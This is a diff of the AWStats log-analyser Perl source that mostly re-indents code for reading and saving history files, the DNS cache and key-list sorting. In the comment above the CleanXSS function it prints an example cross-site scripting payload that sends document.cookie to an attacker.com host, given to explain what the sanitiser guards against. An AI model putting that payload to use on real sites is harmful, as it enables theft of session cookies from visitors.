-										   ? XMLDecodeFromHisto($_)
-										   : $_
-										)
+							/\s+/,
+							(
+								$readxml
+								? XMLDecodeFromHisto($_)
+								: $_
+							)
 						);
 						$countlines++;
-					  } until (    $field[0] eq "END_SIDER_$code"
-								|| $field[0] eq "${xmleb}END_SIDER_$code"
-								|| !$_ );
-					if (    $field[0] ne "END_SIDER_$code"
-						 && $field[0] ne "${xmleb}END_SIDER_$code" )
+					  } until ( $field[0] eq "END_SIDER_$code"
+						  || $field[0] eq "${xmleb}END_SIDER_$code"
+						  || !$_ );
+					if (   $field[0] ne "END_SIDER_$code"
+						&& $field[0] ne "${xmleb}END_SIDER_$code" )
 					{
 						error(
 "History file \"$filetoread\" is corrupted (End of section SIDER_$code not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
@@ -5663,7 +5744,8 @@ sub Read_History_With_TmpUpdate {
 						);
 					}
 					if ($Debug) {
-						debug(                " End of SIDER_$code section ($count entries, $countloaded loaded)"
+						debug(
+" End of SIDER_$code section ($count entries, $countloaded loaded)"
 						);
 					}
 					delete $SectionsToLoad{"sider_$code"};
@@ -5694,23 +5776,24 @@ sub Read_History_With_TmpUpdate {
 						if ( $field[0] ne '' ) {
 							$count++;
 							if ( $SectionsToLoad{"extra_$extranum"} ) {
-								if (    $ExtraStatTypes[$extranum] =~ /P/i
-									 && $field[1] )
+								if (   $ExtraStatTypes[$extranum] =~ /P/i
+									&& $field[1] )
 								{
 									${ '_section_' . $extranum . '_p' }
 									  { $field[0] } += $field[1];
 								}
 								${ '_section_' . $extranum . '_h' }
 								  { $field[0] } += $field[2];
-								if (    $ExtraStatTypes[$extranum] =~ /B/i
-									 && $field[3] )
+								if (   $ExtraStatTypes[$extranum] =~ /B/i
+									&& $field[3] )
 								{
 									${ '_section_' . $extranum . '_k' }
 									  { $field[0] } += $field[3];
 								}
 								if ( $ExtraStatTypes[$extranum] =~ /L/i
-									 && !${ '_section_' . $extranum . '_l' }
-									 { $field[0] } && $field[4] )
+									&& !${ '_section_' . $extranum . '_l' }
+									{ $field[0] }
+									&& $field[4] )
 								{
 									${ '_section_' . $extranum . '_l' }
 									  { $field[0] } = int( $field[4] );
@@ -5722,19 +5805,19 @@ sub Read_History_With_TmpUpdate {
 						chomp $_;
 						s/\r//;
 						@field = split(
-										/\s+/,
-										(
-										   $readxml
-										   ? XMLDecodeFromHisto($_)
-										   : $_
-										)
+							/\s+/,
+							(
+								$readxml
+								? XMLDecodeFromHisto($_)
+								: $_
+							)
 						);
 						$countlines++;
-					  } until (    $field[0] eq "END_EXTRA_$extranum"
-								|| $field[0] eq "${xmleb}END_EXTRA_$extranum"
-								|| !$_ );
-					if (    $field[0] ne "END_EXTRA_$extranum"
-						 && $field[0] ne "${xmleb}END_EXTRA_$extranum" )
+					  } until ( $field[0] eq "END_EXTRA_$extranum"
+						  || $field[0] eq "${xmleb}END_EXTRA_$extranum"
+						  || !$_ );
+					if (   $field[0] ne "END_EXTRA_$extranum"
+						&& $field[0] ne "${xmleb}END_EXTRA_$extranum" )
 					{
 						error(
 "History file \"$filetoread\" is corrupted (End of section EXTRA_$extranum not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
@@ -5742,7 +5825,8 @@ sub Read_History_With_TmpUpdate {
 						);
 					}
 					if ($Debug) {
-						debug(                " End of EXTRA_$extranum section ($count entries, $countloaded loaded)"
+						debug(
+" End of EXTRA_$extranum section ($count entries, $countloaded loaded)"
 						);
 					}
 					delete $SectionsToLoad{"extra_$extranum"};
@@ -5765,8 +5849,8 @@ sub Read_History_With_TmpUpdate {
 			}
 
 			# BEGIN_PLUGINS
-			if (    $AtLeastOneSectionPlugin
-				 && $field[0] =~ /^BEGIN_PLUGIN_(\w+)$/i )
+			if (   $AtLeastOneSectionPlugin
+				&& $field[0] =~ /^BEGIN_PLUGIN_(\w+)$/i )
 			{
 				my $pluginname = $1;
 				my $found      = 0;
@@ -5782,11 +5866,11 @@ sub Read_History_With_TmpUpdate {
 #               		    eval("$function");
 						my $function = "SectionReadHistory_$pluginname";
 						&$function( $issectiontoload, $readxml, $xmleb,
-									$countlines );
+							$countlines );
 						delete $SectionsToLoad{"plugin_$pluginname"};
 						if ( $SectionsToSave{"plugin_$pluginname"} ) {
 							Save_History( "plugin_$pluginname",
-										  $year, $month, $date );
+								$year, $month, $date );
 							delete $SectionsToSave{"plugin_$pluginname"};
 							if ($withpurge) {
 
@@ -5812,17 +5896,17 @@ sub Read_History_With_TmpUpdate {
 						chomp $_;
 						s/\r//;
 						@field = split(
-										/\s+/,
-										(
-										   $readxml
-										   ? XMLDecodeFromHisto($_)
-										   : $_
-										)
+							/\s+/,
+							(
+								$readxml
+								? XMLDecodeFromHisto($_)
+								: $_
+							)
 						);
 						$countlines++;
-					  } until (    $field[0] eq "END_PLUGIN_$pluginname"
-								|| $field[0] eq "${xmleb}END_PLUGIN_$pluginname"
-								|| !$_ );
+					  } until ( $field[0] eq "END_PLUGIN_$pluginname"
+						  || $field[0] eq "${xmleb}END_PLUGIN_$pluginname"
+						  || !$_ );
 				}
 				next;
 			}
@@ -5890,16 +5974,18 @@ sub Read_History_With_TmpUpdate {
 # Write all unwrote sections in section order ('general','time', 'day','sider','session' and other...)
 	if ($Debug) {
 		debug(
-			   " Check and write all unwrote sections: "
-				 . join( ',', keys %SectionsToSave ),
-			   2
+			" Check and write all unwrote sections: "
+			  . join( ',', keys %SectionsToSave ),
+			2
 		);
 	}
-	foreach my $key ( sort { $SectionsToSave{$a} <=> $SectionsToSave{$b} }
-					  keys %SectionsToSave )
+	foreach my $key (
+		sort { $SectionsToSave{$a} <=> $SectionsToSave{$b} }
+		keys %SectionsToSave
+	  )
 	{
 		Save_History( "$key", $year, $month, $date, $lastlinenb,
-					  $lastlineoffset, $lastlinechecksum );
+			$lastlineoffset, $lastlinechecksum );
 	}
 	%SectionsToSave = ();
 
@@ -5911,7 +5997,8 @@ sub Read_History_With_TmpUpdate {
 		foreach ( sort { $PosInFile{$a} <=> $PosInFile{$b} } keys %ValueInFile )
 		{
 			if ($Debug) {
-				debug(          " Update offset of section $_=$ValueInFile{$_} in file at offset $PosInFile{$_}"
+				debug(
+" Update offset of section $_=$ValueInFile{$_} in file at offset $PosInFile{$_}"
 				);
 			}
 			if ( $PosInFile{"$_"} ) {
@@ -5922,25 +6009,29 @@ sub Read_History_With_TmpUpdate {
 
 		# Save last data in general sections
 		if ($Debug) {
-			debug(       " Update MonthVisits=$MonthVisits{$year.$month} in file at offset $PosInFile{TotalVisits}"
+			debug(
+" Update MonthVisits=$MonthVisits{$year.$month} in file at offset $PosInFile{TotalVisits}"
 			);
 		}
 		seek( HISTORYTMP, $PosInFile{"TotalVisits"}, 0 );
 		print HISTORYTMP $MonthVisits{ $year . $month };
 		if ($Debug) {
-			debug(       " Update MonthUnique=$MonthUnique{$year.$month} in file at offset $PosInFile{TotalUnique}"
+			debug(
+" Update MonthUnique=$MonthUnique{$year.$month} in file at offset $PosInFile{TotalUnique}"
 			);
 		}
 		seek( HISTORYTMP, $PosInFile{"TotalUnique"}, 0 );
 		print HISTORYTMP $MonthUnique{ $year . $month };
 		if ($Debug) {
-			debug(       " Update MonthHostsKnown=$MonthHostsKnown{$year.$month} in file at offset $PosInFile{MonthHostsKnown}"
+			debug(
+" Update MonthHostsKnown=$MonthHostsKnown{$year.$month} in file at offset $PosInFile{MonthHostsKnown}"
 			);
 		}
 		seek( HISTORYTMP, $PosInFile{"MonthHostsKnown"}, 0 );
 		print HISTORYTMP $MonthHostsKnown{ $year . $month };
 		if ($Debug) {
-			debug(       " Update MonthHostsUnknown=$MonthHostsUnknown{$year.$month} in file at offset $PosInFile{MonthHostsUnknown}"
+			debug(
+" Update MonthHostsUnknown=$MonthHostsUnknown{$year.$month} in file at offset $PosInFile{MonthHostsUnknown}"
 			);
 		}
 		seek( HISTORYTMP, $PosInFile{"MonthHostsUnknown"}, 0 );
@@ -5958,7 +6049,7 @@ sub Read_History_With_TmpUpdate {
 	if ($withupdate) {
 		if ( $HistoryAlreadyFlushed{"$year$month$day$hour"} ) {
 			debug(
-				 "Rename tmp history file bis '$filetoread' to '$filetowrite'");
+				"Rename tmp history file bis '$filetoread' to '$filetowrite'");
 			if ( rename( $filetowrite, $filetoread ) == 0 ) {
 				error("Failed to update tmp history file $filetoread");
 			}
@@ -5993,22 +6084,22 @@ sub Save_History {
 
 	my $xml = ( $BuildHistoryFormat eq 'xml' ? 1 : 0 );
 	my (
-		 $xmlbb, $xmlbs, $xmlbe, $xmlhb, $xmlhs, $xmlhe,
-		 $xmlrb, $xmlrs, $xmlre, $xmleb, $xmlee
+		$xmlbb, $xmlbs, $xmlbe, $xmlhb, $xmlhs, $xmlhe,
+		$xmlrb, $xmlrs, $xmlre, $xmleb, $xmlee
 	  )
 	  = ( '', '', '', '', '', '', '', '', '', '', '' );
 	if ($xml) {
 		(
-		   $xmlbb, $xmlbs, $xmlbe, $xmlhb, $xmlhs, $xmlhe,
-		   $xmlrb, $xmlrs, $xmlre, $xmleb, $xmlee
+			$xmlbb, $xmlbs, $xmlbe, $xmlhb, $xmlhs, $xmlhe,
+			$xmlrb, $xmlrs, $xmlre, $xmleb, $xmlee
 		  )
 		  = (
-			  "</comment><nu>\n", '</nu><recnb>',
-			  '</recnb><table>',  '<tr><th>',
-			  '</th><th>',        '</th></tr>',
-			  '<tr><td>',         '</td><td>',
-			  '</td></tr>',       '</table><nu>',
-			  "\n</nu></section>"
+			"</comment><nu>\n", '</nu><recnb>',
+			'</recnb><table>',  '<tr><th>',
+			'</th><th>',        '</th></tr>',
+			'<tr><td>',         '</td><td>',
+			'</td></tr>',       '</table><nu>',
+			"\n</nu></section>"
 		  );
 	}
 	else { $xmlbs = ' '; $xmlhs = ' '; $xmlrs = ' '; }
@@ -6038,8 +6129,8 @@ sub Save_History {
 		if ($xml) { print HISTORYTMP "</lib><comment>\n"; }
 		print HISTORYTMP
 "# If you remove this file, all statistics for date $breakdate will be lost/reset.\n";
-		print HISTORYTMP 
-"# Last config file used to build this data file was $FileConfig.\n";
+		print HISTORYTMP
+		  "# Last config file used to build this data file was $FileConfig.\n";
 		if ($xml) { print HISTORYTMP "</comment></version>\n"; }
 		print HISTORYTMP "\n";
 		if ($xml) {
@@ -6165,8 +6256,8 @@ sub Save_History {
 	}
 
 	# General
-	if ($sectiontosave eq 'general') {
-		$LastUpdate=int("$nowyear$nowmonth$nowday$nowhour$nowmin$nowsec");
+	if ( $sectiontosave eq 'general' ) {
+		$LastUpdate = int("$nowyear$nowmonth$nowday$nowhour$nowmin$nowsec");
 		print HISTORYTMP "\n";
 		if ($xml) {
 			print HISTORYTMP "<section id='$sectiontosave'><comment>\n";
@@ -6284,8 +6375,10 @@ sub Save_History {
 		  . "${xmlbe}\n";
 
 # We save page list in score sorted order to get a -output faster and with less use of memory.
-		&BuildKeyList(       $MaxNbOf{'Domain'}, $MinHit{'Domain'},
-					   \%_domener_h,       \%_domener_p );
+		&BuildKeyList(
+			$MaxNbOf{'Domain'}, $MinHit{'Domain'},
+			\%_domener_h,       \%_domener_p
+		);
 		my %keysinkeylist = ();
 		foreach (@keylist) {
 			$keysinkeylist{$_} = 1;
@@ -6325,7 +6418,7 @@ sub Save_History {
 
 # We save page list in score sorted order to get a -output faster and with less use of memory.
 		&BuildKeyList( $MaxNbOf{'HostsShown'}, $MinHit{'Host'}, \%_host_h,
-					   \%_host_p );
+			\%_host_p );
 		my %keysinkeylist = ();
 		foreach my $key (@keylist) {
 			if ( $key !~ /^\d+\.\d+\.\d+\.\d+$/ && $key !~ /^[0-9A-F]*:/i ) {
@@ -6424,7 +6517,7 @@ sub Save_History {
 
 # We save login list in score sorted order to get a -output faster and with less use of memory.
 		&BuildKeyList( $MaxNbOf{'LoginShown'}, $MinHit{'Login'}, \%_login_h,
-					   \%_login_p );
+			\%_login_p );
 		my %keysinkeylist = ();
 		foreach (@keylist) {
 			$keysinkeylist{$_} = 1;
@@ -6469,7 +6562,7 @@ sub Save_History {
 
 # We save robot list in score sorted order to get a -output faster and with less use of memory.
 		&BuildKeyList( $MaxNbOf{'RobotShown'}, $MinHit{'Robot'}, \%_robot_h,
-					   \%_robot_h );
+			\%_robot_h );
 		my %keysinkeylist = ();
 		foreach (@keylist) {
 			$keysinkeylist{$_} = 1;
@@ -6509,7 +6602,7 @@ sub Save_History {
 
 # We save worm list in score sorted order to get a -output faster and with less use of memory.
 		&BuildKeyList( $MaxNbOf{'WormsShown'}, $MinHit{'Worm'}, \%_worm_h,
-					   \%_worm_h );
+			\%_worm_h );
 		my %keysinkeylist = ();
 		foreach (@keylist) {
 			$keysinkeylist{$_} = 1;
@@ -6545,7 +6638,7 @@ sub Save_History {
 
 # We save sender email list in score sorted order to get a -output faster and with less use of memory.
 		&BuildKeyList( $MaxNbOf{'EMailsShown'}, $MinHit{'EMail'}, \%_emails_h,
-					   \%_emails_h );
+			\%_emails_h );
 		my %keysinkeylist = ();
 		foreach (@keylist) {
 			$keysinkeylist{$_} = 1;
@@ -6581,7 +6674,7 @@ sub Save_History {
 
 # We save receiver email list in score sorted order to get a -output faster and with less use of memory.
 		&BuildKeyList( $MaxNbOf{'EMailsShown'}, $MinHit{'EMail'}, \%_emailr_h,
-					   \%_emailr_h );
+			\%_emailr_h );
 		my %keysinkeylist = ();
 		foreach (@keylist) {
 			$keysinkeylist{$_} = 1;
@@ -6638,7 +6731,7 @@ sub Save_History {
 
 # We save page list in score sorted order to get a -output faster and with less use of memory.
 		&BuildKeyList( $MaxNbOf{'PageShown'}, $MinHit{'File'}, \%_url_p,
-					   \%_url_p );
+			\%_url_p );
 		%keysinkeylist = ();
 		foreach (@keylist) {
 			$keysinkeylist{$_} = 1;
@@ -6850,8 +6943,10 @@ sub Save_History {
 		  . "${xmlbe}\n";
 
 # We save page list in score sorted order to get a -output faster and with less use of memory.
-		&BuildKeyList(       $MaxNbOf{'RefererShown'}, $MinHit{'Refer'},
-					   \%_pagesrefs_h,           \%_pagesrefs_p );
+		&BuildKeyList(
+			$MaxNbOf{'RefererShown'}, $MinHit{'Refer'},
+			\%_pagesrefs_h,           \%_pagesrefs_p
+		);
 		%keysinkeylist = ();
 		foreach (@keylist) {
 			$keysinkeylist{$_} = 1;
@@ -6898,7 +6993,7 @@ sub Save_History {
 
 # We save key list in score sorted order to get a -output faster and with less use of memory.
 		&BuildKeyList( $MaxNbOf{'KeywordsShown'},
-					   $MinHit{'Keyword'}, \%_keyphrases, \%_keyphrases );
+			$MinHit{'Keyword'}, \%_keyphrases, \%_keyphrases );
 		%keysinkeylist = ();
 		foreach my $key (@keylist) {
 			$keysinkeylist{$key} = 1;
@@ -6944,7 +7039,7 @@ sub Save_History {
 
 # We save key list in score sorted order to get a -output faster and with less use of memory.
 		&BuildKeyList( $MaxNbOf{'KeywordsShown'},
-					   $MinHit{'Keyword'}, \%_keywords, \%_keywords );
+			$MinHit{'Keyword'}, \%_keywords, \%_keywords );
 		%keysinkeylist = ();
 		foreach (@keylist) {
 			$keysinkeylist{$_} = 1;
@@ -7072,10 +7167,10 @@ sub Save_History {
 			  . scalar( keys %{ '_section_' . $extranum . '_h' } )
 			  . "${xmlbe}\n";
 			&BuildKeyList(
-						   $MaxNbOfExtra[$extranum],
-						   $MinHitExtra[$extranum],
-						   \%{ '_section_' . $extranum . '_h' },
-						   \%{ '_section_' . $extranum . '_p' }
+				$MaxNbOfExtra[$extranum],
+				$MinHitExtra[$extranum],
+				\%{ '_section_' . $extranum . '_h' },
+				\%{ '_section_' . $extranum . '_p' }
 			);
 			%keysinkeylist = ();
 			foreach (@keylist) {
@@ -7114,8 +7209,10 @@ sub Save_History {
 #   		my $function="SectionWriteHistory_$pluginname(\$xml,\$xmlbb,\$xmlbs,\$xmlbe,\$xmlrb,\$xmlrs,\$xmlre,\$xmleb,\$xmlee)";
 #  		    eval("$function");
 			my $function = "SectionWriteHistory_$pluginname";
-			&$function(          $xml,   $xmlbb, $xmlbs, $xmlbe, $xmlrb,
-						$xmlrs, $xmlre, $xmleb, $xmlee );
+			&$function(
+				$xml,   $xmlbb, $xmlbs, $xmlbe, $xmlrb,
+				$xmlrs, $xmlre, $xmleb, $xmlee
+			);
 		}
 	}
 
@@ -7146,13 +7243,14 @@ sub Rename_All_Tmp_History {
 	elsif ( $DatabaseBreak eq 'day' )   { $datemask = '\d\d\d\d\d\d\d\d'; }
 	elsif ( $DatabaseBreak eq 'hour' )  { $datemask = '\d\d\d\d\d\d\d\d\d\d'; }
 	if ($Debug) {
-		debug(    "Scan for temp history files to rename into DirData='$DirData' with mask='$datemask'"
+		debug(
+"Scan for temp history files to rename into DirData='$DirData' with mask='$datemask'"
 		);
 	}
 
 	my $regfilesuffix = quotemeta($FileSuffix);
 	foreach ( grep /^$PROG($datemask)$regfilesuffix\.tmp\.$pid$/,
-			  file_filt sort readdir DIR )
+		file_filt sort readdir DIR )
 	{
 		/^$PROG($datemask)$regfilesuffix\.tmp\.$pid$/;
 		if ($renameok) {    # No rename error yet
@@ -7176,13 +7274,14 @@ sub Rename_All_Tmp_History {
 
 #if (FileCopy("$DirData/$PROG$1$FileSuffix.txt","$DirData/$PROG$1$FileSuffix.bak")) {
 						if (
-							 rename(
-									 "$DirData/$PROG$1$FileSuffix.txt",
-									 "$DirData/$PROG$1$FileSuffix.bak"
-							 ) == 0
+							rename(
+								"$DirData/$PROG$1$FileSuffix.txt",
+								"$DirData/$PROG$1$FileSuffix.bak"
+							) == 0
 						  )
 						{
-							warning(                 "Warning: Failed to make a backup of \"$DirData/$PROG$1$FileSuffix.txt\" into \"$DirData/$PROG$1$FileSuffix.bak\"."
+							warning(
+"Warning: Failed to make a backup of \"$DirData/$PROG$1$FileSuffix.txt\" into \"$DirData/$PROG$1$FileSuffix.bak\"."
 							);
 						}
 						if ($SaveDatabaseFilesWithPermissionsForEveryone) {
@@ -7196,10 +7295,10 @@ sub Rename_All_Tmp_History {
 					}
 				}
 				if (
-					 rename(
-							 "$DirData/$PROG$1$FileSuffix.tmp.$$",
-							 "$DirData/$PROG$1$FileSuffix.txt"
-					 ) == 0
+					rename(
+						"$DirData/$PROG$1$FileSuffix.tmp.$$",
+						"$DirData/$PROG$1$FileSuffix.txt"
+					) == 0
 				  )
 				{
 					$renameok =
@@ -7209,9 +7308,9 @@ sub Rename_All_Tmp_History {
 					warning(
 "Warning: Failed to rename \"$DirData/$PROG$1$FileSuffix.tmp.$$\" into \"$DirData/$PROG$1$FileSuffix.txt\".\nWrite permissions on \"$PROG$1$FileSuffix.txt\" might be wrong"
 						  . (
-							  $ENV{'GATEWAY_INTERFACE'}
-							  ? " for an 'update from web'"
-							  : ""
+							$ENV{'GATEWAY_INTERFACE'}
+							? " for an 'update from web'"
+							: ""
 						  )
 						  . " or file might be opened."
 					);
@@ -7254,9 +7353,9 @@ sub Read_DNS_Cache {
 	if ( $dnscachefile =~ s/(\.\w+)$// ) { $dnscacheext = $1; }
 	foreach my $dir ( "$DirData", ".", "" ) {
 		my $searchdir = $dir;
-		if (    $searchdir
-			 && ( !( $searchdir =~ /\/$/ ) )
-			 && ( !( $searchdir =~ /\\$/ ) ) )
+		if (   $searchdir
+			&& ( !( $searchdir =~ /\/$/ ) )
+			&& ( !( $searchdir =~ /\\$/ ) ) )
 		{
 			$searchdir .= "/";
 		}
@@ -7266,8 +7365,10 @@ sub Read_DNS_Cache {
 
 		# Plugin call : Change filetoload
 		if ( $PluginsLoaded{'SearchFile'}{'hashfiles'} ) {
-			SearchFile_hashfiles(          $searchdir,   $dnscachefile, $filesuffix,
-								  $dnscacheext, $filetoload );
+			SearchFile_hashfiles(
+				$searchdir,   $dnscachefile, $filesuffix,
+				$dnscacheext, $filetoload
+			);
 		}
 		if ($filetoload) { last; }    # We found a file to load
 	}
@@ -7300,12 +7401,12 @@ sub Read_DNS_Cache {
 	}
 	if ($Debug) {
 		debug(
-			   " Loaded "
-				 . ( scalar keys %$hashtoload )
-				 . " items from $filetoload in "
-				 . ( time() - $timetoload )
-				 . " seconds.",
-			   1
+			" Loaded "
+			  . ( scalar keys %$hashtoload )
+			  . " items from $filetoload in "
+			  . ( time() - $timetoload )
+			  . " seconds.",
+			1
 		);
 	}
 	return 0;
@@ -7344,7 +7445,7 @@ sub Save_DNS_Cache_File {
 # Plugin call : Save hash file (only $NBOFLASTUPDATELOOKUPTOSAVE records) with no test if up to date
 	if ( $PluginsLoaded{'SaveHash'}{'hashfiles'} ) {
 		SaveHash_hashfiles( $filetosave, $hashtosave, 0, $nbofelemtosave,
-							$nbofelemsaved );
+			$nbofelemsaved );
 		if ($SaveDatabaseFilesWithPermissionsForEveryone) {
 			chmod 0666, "$filetosave";
 		}
@@ -7353,17 +7454,18 @@ sub Save_DNS_Cache_File {
 		$filetosave = "$dnscachefile$filesuffix$dnscacheext";
 		if ($Debug) {
 			debug(
-				   " Save data "
-					 . (
-						 $nbofelemtosave
-						 ? "($nbofelemtosave records max)"
-						 : "(all records)"
-					 )
-					 . " into file $filetosave"
+				" Save data "
+				  . (
+					$nbofelemtosave
+					? "($nbofelemtosave records max)"
+					: "(all records)"
+				  )
+				  . " into file $filetosave"
 			);
 		}
 		if ( !open( DNSFILE, ">$filetosave" ) ) {
-			warning(     "Warning: Failed to open for writing last update DNS Cache file \"$filetosave\": $!"
+			warning(
+"Warning: Failed to open for writing last update DNS Cache file \"$filetosave\": $!"
 			);
 			return 1;
 		}
@@ -7389,10 +7491,10 @@ sub Save_DNS_Cache_File {
 	}
 	if ($Debug) {
 		debug(
-			   " Saved $nbofelemsaved items into $filetosave in "
-				 . ( time() - $timetosave )
-				 . " seconds.",
-			   1
+			" Saved $nbofelemsaved items into $filetosave in "
+			  . ( time() - $timetosave )
+			  . " seconds.",
+			1
 		);
 	}
 	return 0;
@@ -7418,7 +7520,7 @@ sub GetDelaySinceStart {
 		$StartMicroseconds = $newmicroseconds;
 	}
 	return ( ( $newseconds - $StartSeconds ) * 1000 +
-			 int( ( $newmicroseconds - $StartMicroseconds ) / 1000 ) );
+		  int( ( $newmicroseconds - $StartMicroseconds ) / 1000 ) );
 }
 
 #------------------------------------------------------------------------------
@@ -7523,7 +7625,7 @@ sub XMLEncode {
 #------------------------------------------------------------------------------
 # Function:		Transforms spaces into %20 and special chars by HTML entities as needed in XML/XHTML
 #				Decoding is done by XMLDecodeFromHisto.
-#				AWStats data files are stored in ISO-8859-1. 
+#				AWStats data files are stored in ISO-8859-1.
 # Parameters:	stringtoencode
 # Return:		encodedstring
 #------------------------------------------------------------------------------
@@ -7547,7 +7649,7 @@ sub XMLEncodeForHisto {
 #------------------------------------------------------------------------------
 sub EncodeToPageCode {
 	my $string = shift;
-	if ($PageCode eq 'utf-8') { $string=encode("utf8", $string); }
+	if ( $PageCode eq 'utf-8' ) { $string = encode( "utf8", $string ); }
 	return $string;
 }
 
@@ -7619,7 +7721,7 @@ sub Sanitize {
 #               and clean | char.
 #				A XSS attack is providing an AWStats url with XSS code that is executed
 #				when page loaded by awstats CGI is loaded from AWStats server. Such a code
-#				can be<script>document.write("<img src=http://attacker.com/� + document.cookie + �>�)</script>
+#				can be<script>document.write("<img src=http://attacker.com/page.php?" + document.cookie)</script>
 #				This make the browser sending a request to the attacker server that contains
 #				cookie used for AWStats server sessions. Attacker can this way caught this
 #				cookie and used it to go on AWStats server like original visitor. For this
@@ -7645,7 +7747,7 @@ sub CleanXSS {
 
 #------------------------------------------------------------------------------
 # Function:     Clean tags in a string
-#				AWStats data files are stored in ISO-8859-1. 
+#				AWStats data files are stored in ISO-8859-1.
 # Parameters:   stringtodecode
 # Input:        None
 # Output:       None
@@ -7720,13 +7822,9 @@ sub Show_Flag_Links {
 	my $NewLinkParams = $QueryString;
 	my $NewLinkTarget = '';
 	if ( $ENV{'GATEWAY_INTERFACE'} ) {
-		$NewLinkParams = CleanNewLinkParamsFrom(
-												 $NewLinkParams,
-												 (
-												   'update',    'staticlinks',
-												   'framename', 'lang'
-												 )
-		);
+		$NewLinkParams =
+		  CleanNewLinkParamsFrom( $NewLinkParams,
+			( 'update', 'staticlinks', 'framename', 'lang' ) );
 		$NewLinkParams =~ s/(^|&|&amp;)update(=\w*|$)//i;
 		$NewLinkParams =~ s/(^|&|&amp;)staticlinks(=\w*|$)//i;
 		$NewLinkParams =~ s/(^|&|&amp;)framename=[^&]*//i;
@@ -7757,15 +7855,15 @@ sub Show_Flag_Links {
 		  : $lng;
 		if ( $lng ne $CurrentLang ) {
 			my %lngtitle = (
-							 'en', 'English', 'fr', 'French',
-							 'de', 'German',  'it', 'Italian',
-							 'nl', 'Dutch',   'es', 'Spanish'
+				'en', 'English', 'fr', 'French', 'de', 'German',
+				'it', 'Italian', 'nl', 'Dutch',  'es', 'Spanish'
 			);
 			my $lngtitle = ( $lngtitle{$lng} ? $lngtitle{$lng} : $lng );
-			my $flag =
-			  (   $LangAWStatsToFlagAwstats{$lng}
+			my $flag = (
+				  $LangAWStatsToFlagAwstats{$lng}
 				? $LangAWStatsToFlagAwstats{$lng}
-				: $lng );
+				: $lng
+			);
 			print "<a href=\""
 			  . XMLEncode("$AWScript?${NewLinkParams}lang=$lng")
 			  . "\"$NewLinkTarget><img src=\"$DirIcons\/flags\/$flag.png\" height=\"14\" border=\"0\""
@@ -7933,11 +8031,11 @@ sub AddInTree {
 		$lowerval = $keyval;
 		if ($Debug) {
 			debug(
-				   "  lowerval=$lowerval, nb elem val="
-					 . ( scalar keys %val )
-					 . ", nb elem egal="
-					 . ( scalar keys %egal ) . ".",
-				   4
+				"  lowerval=$lowerval, nb elem val="
+				  . ( scalar keys %val )
+				  . ", nb elem egal="
+				  . ( scalar keys %egal ) . ".",
+				4
 			);
 		}
 		return;
@@ -7948,11 +8046,11 @@ sub AddInTree {
 		$val{$keyval}    = $keytoadd;
 		if ($Debug) {
 			debug(
-				   "  lowerval=$lowerval, nb elem val="
-					 . ( scalar keys %val )
-					 . ", nb elem egal="
-					 . ( scalar keys %egal ) . ".",
-				   4
+				"  lowerval=$lowerval, nb elem val="
+				  . ( scalar keys %val )
+				  . ", nb elem egal="
+				  . ( scalar keys %egal ) . ".",
+				4
 			);
 		}
 		return;
@@ -7970,11 +8068,11 @@ sub AddInTree {
 		$lowerval         = $keyval;
 		if ($Debug) {
 			debug(
-				   "  lowerval=$lowerval, nb elem val="
-					 . ( scalar keys %val )
-					 . ", nb elem egal="
-					 . ( scalar keys %egal ) . ".",
-				   4
+				"  lowerval=$lowerval, nb elem val="
+				  . ( scalar keys %val )
+				  . ", nb elem egal="
+				  . ( scalar keys %egal ) . ".",
+				4
 			);
 		}
 		return;
@@ -7996,11 +8094,11 @@ sub AddInTree {
 	$nextval{$valcursor} = $keyval;
 	if ($Debug) {
 		debug(
-			   "  lowerval=$lowerval, nb elem val="
-				 . ( scalar keys %val )
-				 . ", nb elem egal="
-				 . ( scalar keys %egal ) . ".",
-			   4
+			"  lowerval=$lowerval, nb elem val="
+			  . ( scalar keys %val )
+			  . ", nb elem egal="
+			  . ( scalar keys %egal ) . ".",
+			4
 		);
 	}
 }
@@ -8027,11 +8125,11 @@ sub Removelowerval {
 	}
 	if ($Debug) {
 		debug(
-			   "   new lower value=$lowerval, val size="
-				 . ( scalar keys %val )
-				 . ", egal size="
-				 . ( scalar keys %egal ),
-			   4
+			"   new lower value=$lowerval, val size="
+			  . ( scalar keys %val )
+			  . ", egal size="
+			  . ( scalar keys %egal ),
+			4
 		);
 	}
 }
@@ -8059,15 +8157,15 @@ sub BuildKeyList {
 	my $hashfororder  = shift;
 	if ($Debug) {
 		debug(
-			   "  BuildKeyList($ArraySize,$MinValue,$hashforselect with size="
-				 . ( scalar keys %$hashforselect )
-				 . ",$hashfororder with size="
-				 . ( scalar keys %$hashfororder ) . ")",
-			   3
+			"  BuildKeyList($ArraySize,$MinValue,$hashforselect with size="
+			  . ( scalar keys %$hashforselect )
+			  . ",$hashfororder with size="
+			  . ( scalar keys %$hashfororder ) . ")",
+			3
 		);
 	}
 	delete $hashforselect->{0};
-	delete $hashforselect->{''
+	delete $hashforselect->{ ''
 	  }; # Those is to protect from infinite loop when hash array has an incorrect null key
 	my $count = 0;
 	$lowerval = 0;    # Global because used in AddInTree and Removelowerval
@@ -8081,10 +8179,10 @@ sub BuildKeyList {
 				$count++;
 				if ($Debug) {
 					debug(
-						   "  Add in tree entry $count : $key (value="
-							 . ( $hashfororder->{$key} || 0 )
-							 . ", tree not full)",
-						   4
+						"  Add in tree entry $count : $key (value="
+						  . ( $hashfororder->{$key} || 0 )
+						  . ", tree not full)",
+						4
 					);
 				}
 				AddInTree( $key, $hashfororder->{$key} || 0, $count );
@@ -8095,10 +8193,10 @@ sub BuildKeyList {
 		if ( ( $hashfororder->{$key} || 0 ) <= $lowerval ) { next; }
 		if ($Debug) {
 			debug(
-				   "  Add in tree entry $count : $key (value="
-					 . ( $hashfororder->{$key} || 0 )
-					 . " > lowerval=$lowerval)",
-				   4
+				"  Add in tree entry $count : $key (value="
+				  . ( $hashfororder->{$key} || 0 )
+				  . " > lowerval=$lowerval)",
+				4
 			);
 		}
 		AddInTree( $key, $hashfororder->{$key} || 0 );
@@ -8109,22 +8207,20 @@ sub BuildKeyList {
 	# Build key list and sort it
 	if ($Debug) {
 		debug(
-			   "  Build key list and sort it. lowerval=$lowerval, nb elem val="
-				 . ( scalar keys %val )
-				 . ", nb elem egal="
-				 . ( scalar keys %egal ) . ".",
-			   3
+			"  Build key list and sort it. lowerval=$lowerval, nb elem val="
+			  . ( scalar keys %val )
+			  . ", nb elem egal="
